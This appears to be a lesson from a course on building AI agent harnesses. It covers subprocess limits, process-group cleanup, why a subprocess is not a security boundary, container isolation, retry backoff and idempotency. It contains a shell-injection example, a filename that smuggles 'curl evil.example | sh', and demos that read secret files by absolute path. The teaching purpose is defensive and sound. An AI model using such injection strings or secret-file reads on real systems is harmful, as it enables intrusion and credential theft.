Your agent wrote a test for a function and ran it. The test calls `input()` to ask for a number, because that's how the original script worked. Nothing will ever type that number, so the process waits forever, and so does your harness. No error, no trace, just a run that never ends.

That's the mild version. The same agent can write code that deletes files, prints until your disk fills, reads your API keys, or sends your files to a server. Usually it does none of that on purpose. It's guessing, and some guesses are destructive. If the harness runs model-written code, it needs limits that hold no matter what the code does. Here's the first one, a time limit:

```python run
import subprocess
import sys
import time

LIMIT = 1
start = time.perf_counter()
try:
    subprocess.run([sys.executable, "-c", "import time; time.sleep(60)"], timeout=LIMIT)
except subprocess.TimeoutExpired:
    print(f"stopped after {time.perf_counter() - start:.1f}s (limit was {LIMIT}s)")
```

`timeout=LIMIT` kills the child once a second has passed and raises `TimeoutExpired`, so the harness gets control back and can tell the model what happened. Every other limit in this lesson works the same way: the harness decides, and the code being run doesn't get a vote.

## What model-written code can do

Start by listing the risks, then match each to a limit. The right-hand column is the uncomfortable part.

| The code does this | The limit that stops it | Does a subprocess give you that? |
| --- | --- | --- |
| Never exits: an infinite loop, waiting for `input()`, a deadlock | Wall-clock timeout; input closed | Yes |
| Starts other processes that outlive it | Kill the whole process group | Yes, on macOS and Linux |
| Prints gigabytes of output | Cap on output and file size | Yes, partly |
| Reads secrets from environment variables | Pass an allowlisted environment | Yes |
| Reads `~/.ssh`, browser data, or files elsewhere on disk | A filesystem that contains only the job's files | **No** |
| Connects to the internet to download or upload | No network access | **No** |
| Uses all memory or CPU, or forks thousands of processes | Kernel resource limits (cgroups) | Only roughly |

A subprocess handles the accidents: hangs, floods, and leaked environment variables. It doesn't stop deliberate or unlucky access to files and the network. The next build-along writes the subprocess layer, and this lesson's last sections cover what to add when you need real isolation.

## Layer one: a child process with limits

Five arguments to `subprocess` do most of the work. To see one of them, set a fake key in the harness's environment and ask two child processes whether they can see it:

```python run
import os
import subprocess
import sys
import tempfile

os.environ["LLM_API_KEY"] = "sk-demo-not-a-real-key"
probe = "import os; print(len(os.environ), 'variables, key visible:', 'LLM_API_KEY' in os.environ)"
with tempfile.TemporaryDirectory() as work:
    for label, env in [("inherited", None), ("allowlisted", {"PATH": os.environ.get("PATH", "")})]:
        done = subprocess.run([sys.executable, "-I", "-c", probe], cwd=work, env=env,
                              stdin=subprocess.DEVNULL, capture_output=True, text=True, timeout=5)
        print(f"{label:>11}: {done.stdout.strip()}")
```

With `env=None` the child inherits everything, key included. With an allowlist it gets only `PATH` (plus a couple of variables Python adds for itself on some systems) and the key is gone. Here's what each argument is for:

- **`cwd=work`**: a fresh temporary folder, so stray relative paths like `open("data.csv", "w")` land somewhere disposable instead of in your project.
- **`env={...}`**: an allowlist, not a blocklist. A blocklist has to predict every secret's name; an allowlist only has to name what the code needs.
- **`-I`**: Python's isolated mode. It ignores `PYTHON*` environment variables and doesn't add the script's folder or your user site-packages to the import path, so a planted `json.py` can't hijack `import json`.
- **`stdin=subprocess.DEVNULL`**: `input()` raises `EOFError` immediately instead of waiting for a person who isn't there. That fixes this lesson's opening bug.
- **`timeout=...`**: the backstop for everything else that never ends.

## Timeouts kill the child, not its children

There's a catch in `timeout`. Python's docs say that when it expires, "the child process will be killed." *The* child: one process. If the code started a helper process of its own, that helper keeps running. This script starts a worker, saves its process id, and then spins forever:

```python run
import os
import signal
import subprocess
import sys
import tempfile
import time

CODE = ("import subprocess, sys\n"
        "worker = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)'])\n"
        "open('worker.pid', 'w').write(str(worker.pid))\n"
        "while True: pass\n")


def alive(pid):
    for _ in range(20):            # give the system a moment to clean up a killed process
        try:
            os.kill(pid, 0)        # signal 0 checks that a process exists without touching it
        except ProcessLookupError:
            return False
        time.sleep(0.05)
    return True


with tempfile.TemporaryDirectory() as work:
    try:
        subprocess.run([sys.executable, "-c", CODE], cwd=work, timeout=1)
    except subprocess.TimeoutExpired:
        pid = int(open(os.path.join(work, "worker.pid")).read())
        print("plain timeout: worker still running?", alive(pid))
        os.kill(pid, signal.SIGKILL)

    child = subprocess.Popen([sys.executable, "-c", CODE], cwd=work, start_new_session=True)
    try:
        child.wait(timeout=1)
    except subprocess.TimeoutExpired:
        os.killpg(child.pid, signal.SIGKILL)   # the child and everything it started
        child.wait()
        pid = int(open(os.path.join(work, "worker.pid")).read())
        print("process group: worker still running?", alive(pid))
```

The plain timeout left the worker running, and a harness that runs hundreds of tasks would pile these up. `start_new_session=True` puts the child in a new process group, and `os.killpg` kills every process in that group at once. Both are POSIX features, so they work on macOS and Linux. On Windows, the build-along falls back to `kill()`, and full cleanup needs a Windows job object, which is beyond this course.

## What a subprocess can't stop

The child above ran in an empty temporary folder with an empty environment. Now let model-written code ask for a file by its absolute path:

```python run
import os
import subprocess
import sys
import tempfile

with open("api_keys.txt", "w") as f:          # a file beside the harness, outside the sandbox folder
    f.write("LLM_API_KEY=sk-demo-not-a-real-key\n")
target = os.path.abspath("api_keys.txt")

generated = f"print(open({target!r}).read().strip())"     # code a model could write
with tempfile.TemporaryDirectory() as work:
    done = subprocess.run([sys.executable, "-I", "-c", generated], cwd=work, env={},
                          stdin=subprocess.DEVNULL, capture_output=True, text=True, timeout=5)
print("child printed:", done.stdout.strip())
```

It read the file. The working folder is just where the process *starts*; it isn't a wall. The child runs as your user, so it can read anything you can read, from `~/.ssh` to your browser's saved data, and it can open network connections, too. The file tools from Module 2 refused paths outside `workspace/`, but code the agent runs never goes through those tools. A subprocess limits accidents. It is not a security boundary.

Real isolation means the code runs somewhere that can't see your files or network at all. From weakest and fastest to strongest and slowest:

- **A container** (Docker, Podman) uses Linux namespaces to give the process its own filesystem, process list, and network, and cgroups to cap memory, CPU, and process count. It shares the host's kernel, so a kernel bug can break out.
- **gVisor** runs containers on a kernel written in user space that intercepts system calls, which shrinks how much of the real kernel the code can reach.
- **A microVM** such as Firecracker boots a tiny virtual machine with its own kernel in a fraction of a second. Many hosted code-execution services use this.
- **A full virtual machine** is the strongest common boundary and the slowest to start.

A locked-down container is a reasonable default for running model-written code on your own machine:

```bash
docker run --rm \
  --network none \
  --read-only --tmpfs /tmp \
  --memory 256m --cpus 1 --pids-limit 64 \
  --cap-drop ALL --security-opt no-new-privileges \
  --user 65534:65534 \
  -v "$PWD/job:/job:ro" -w /job \
  python:3.12-slim timeout 10 python -I main.py
```

Line by line: delete the container afterwards; no network at all; a read-only filesystem except a scratch `/tmp`; 256 MB of memory, one CPU, and at most 64 processes (which stops a fork bomb); no Linux capabilities and no way to gain privileges; run as the unprivileged `nobody` user; mount only the job folder, read-only; and a 10-second limit from the `timeout` command inside. On macOS and Windows, Docker Desktop runs containers inside a Linux VM, which adds another layer between the code and your files.

:::video cjXI-yxqGTI
What to watch for: what a VM virtualizes (hardware, with a whole guest operating system) versus what a container virtualizes (the operating system, sharing one kernel). That shared kernel is why containers start fast and why they're a weaker boundary than VMs.
:::

## Recovering: retry the temporary, report the rest

Failures come in two kinds, and they need opposite responses.

**Failures in the code the model wrote** (a traceback, failing tests, a timeout) aren't the harness's to fix. Send the exit code and the end of stderr back to the model as a tool result, and let it read the error and change its code. That's the loop from Module 2 doing its job.

**Temporary failures in the infrastructure** (a model API returning 429 "too many requests" or a 5xx error, a dropped connection, a request timeout) often succeed if you simply wait and try again. Retrying is the harness's job, and the model never needs to know. Errors like 400, 401, or 404 won't fix themselves, so retrying them only burns time and quota.

When you retry, wait longer each time, and wait a *random* amount. If a hundred clients all hit a rate limit together and all retry exactly 1, 2, then 4 seconds later, they collide again every time. **Full jitter** picks the wait uniformly between zero and a ceiling that doubles each attempt, up to a cap:

```text
wait = random between 0 and min(cap, base * 2 ** attempt)
```

Step through five attempts with `base=0.5` and `cap=8`, and watch the ceiling double until it hits the cap:

:::trace Capped exponential backoff with full jitter
```python
import random

rng = random.Random(17)
base, cap = 0.5, 8.0
waits = []
for attempt in range(5):
    ceiling = min(cap, base * 2 ** attempt)
    wait = round(rng.uniform(0, ceiling), 2)
    waits.append(wait)
print(waits)
```
:::

The ceilings go 0.5, 1, 2, 4, 8, and the waits come out as 0.26, 0.81, 1.92, 1.16, and 6.13 seconds. The fourth wait is shorter than the third, and that's the point of jitter: on average the waits still grow, but no two clients follow the same schedule, so their retries stop colliding.

## Retries can do things twice

A timeout tells you that you didn't hear back. It doesn't tell you whether the work happened. Suppose a tool appends a note to a file, the append succeeds, and then the reply is lost:

```python run
import itertools

notes = []                    # stands in for the outside world: a file, an issue tracker, an inbox
flaky = itertools.count(1)


def append_note(text):
    notes.append(text)        # the side effect happens...
    if next(flaky) == 1:
        raise TimeoutError("reply lost on the way back")   # ...but the caller never hears about it
    return f"note {len(notes)} saved"


def retry(fn, *args, attempts=3):
    for attempt in range(attempts):
        try:
            return fn(*args)
        except TimeoutError:
            if attempt == attempts - 1:
                raise


retry(append_note, "Deadline moved to June 10")
print("plain retry:     ", notes)

notes.clear()
flaky = itertools.count(1)
ledger = {}                   # idempotency key -> the result of the first time


def append_note_once(key, text):
    if key in ledger:         # done before: return that result instead of doing it again
        return ledger[key]
    notes.append(text)
    ledger[key] = f"note {len(notes)} saved"
    if next(flaky) == 1:
        raise TimeoutError("reply lost on the way back")
    return ledger[key]


print(retry(append_note_once, "call_7", "Deadline moved to June 10"))
print("idempotent retry:", notes)
```

The plain retry saved the note twice. Now imagine the tool sends an email or charges a card. An operation is **idempotent** when doing it twice has the same effect as doing it once. Reading a file is. Writing a file with given contents is. Appending is not, and neither is anything that sends or creates. For those, the caller sends an **idempotency key**, the same one on every retry of the same action, and the tool remembers which keys it has already handled. Inside one run, the tool call id is a natural key; for runs you resume later, combine the run id, the step, and the call id.

:::warning
**Building a shell command from model text with `shell=True`.** `subprocess.run(f"python {filename}", shell=True)` hands the whole string to a shell, so a "filename" like `x.py; curl evil.example | sh` runs a second command. Pass a list of arguments, such as `[sys.executable, "-I", "main.py"]`, so each piece is one argument and nothing gets interpreted by a shell.
:::

:::warning
**Retrying everything.** `except Exception: retry()` retries a 401 for a bad key four times, retries the model's own syntax errors as if they were network trouble, and multiplies your bill. Retry only errors you've decided are temporary, and let everything else through on the first attempt.
:::

:::quiz
Q: The sandbox runs model code with `cwd` set to a fresh temp folder and `env` set to only `PATH`. The code runs `open("/Users/you/.ssh/id_ed25519").read()`. What happens?
- [ ] It fails, because the process can only see its working folder
  The working folder is just where relative paths start; it limits nothing.
- [x] It succeeds, because the child runs as your user and can read anything you can
  Stopping it needs a separate filesystem, such as a container that mounts only the job folder.
- [ ] It fails, because `-I` blocks file access
  Isolated mode changes how Python finds modules and reads `PYTHON*` variables; it doesn't restrict files.

Q: A model-written script starts a helper process and then loops forever. You use `subprocess.run(..., timeout=5)`. After the timeout, what's still running?
- [x] The helper process, because only the direct child was killed
  Start the child in its own session and kill the whole process group on timeout.
- [ ] Nothing; a timeout stops all related processes
  Python's docs are specific: the child process is killed, not its descendants.
- [ ] The original script, because timeouts only raise an exception
  `subprocess.run` does kill the child before re-raising `TimeoutExpired`.

Q: Which failure should the harness retry with backoff?
- [ ] The model's code raised `ZeroDivisionError`
  That's the model's bug; send the traceback back so it can fix the code.
- [ ] The provider returned HTTP 401 Unauthorized
  A bad key stays bad, so every retry fails the same way.
- [x] The provider returned HTTP 503 Service Unavailable
  A 503 is usually temporary overload, so waiting and retrying often works.

Q: A `create_issue` tool times out. You don't know if the issue was created. What makes retrying safe?
- [ ] Retrying immediately, before the server notices
  Speed doesn't change whether the first request created the issue.
- [x] Sending the same idempotency key on each attempt, so the server creates the issue at most once
  The server recognizes the repeat and returns the first result instead of doing the work again.
- [ ] Waiting with full jitter before the retry
  Jitter spreads out retries; it does nothing about duplicates.
:::

:::takeaways
- Model-written code needs limits that hold whatever it does: a timeout, closed input, an allowlisted environment, and an output cap.
- A timeout kills one process; start a new session and kill the process group to clean up everything the code started.
- A subprocess is not a security boundary. It can read your files and use the network; containers, gVisor, microVMs, and VMs give real isolation.
- Send the model's own errors back to the model; retry only temporary infrastructure failures, with capped exponential backoff and full jitter.
- Retries can repeat side effects. Make tools idempotent, or protect them with an idempotency key.
:::
